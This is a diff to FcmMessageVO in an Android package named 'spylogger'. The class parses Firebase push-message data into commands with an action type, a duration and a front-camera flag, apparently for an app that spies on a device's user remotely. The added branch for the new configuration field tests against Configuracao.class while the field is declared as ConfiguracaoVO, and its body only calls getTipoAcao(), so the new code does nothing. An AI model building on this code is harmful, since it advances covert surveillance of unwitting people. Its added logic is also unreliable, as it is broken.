@@ -2,6 +2,7 @@ package com.gravatasufoca.spylogger.vos;
 
 import android.util.Log;
 
+import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.TipoAcao;
 
 import java.lang.reflect.Field;
@@ -24,6 +25,7 @@ public class FcmMessageVO {
     private Integer id;
     private Integer duracao;
     private Boolean cameraFrente;
+    private ConfiguracaoVO configuracao;
 
     public static FcmMessageVO converter(Map<String, String> data) {
         FcmMessageVO fcmMessageVO = new FcmMessageVO();
@@ -42,7 +44,10 @@ public class FcmMessageVO {
                         field.set(fcmMessageVO, Boolean.parseBoolean(data.get(field.getName())));
                     } else if (field.getType().isAssignableFrom(TipoAcao.class)) {
                         field.set(fcmMessageVO, TipoAcao.values()[Integer.parseInt(data.get(field.getName()))]);
+                    } else if (field.getType().isAssignableFrom(Configuracao.class)) {
+                        fcmMessageVO.getTipoAcao();
                     }
+
 
                     field.setAccessible(false);
                 } catch (IllegalAccessException e) {
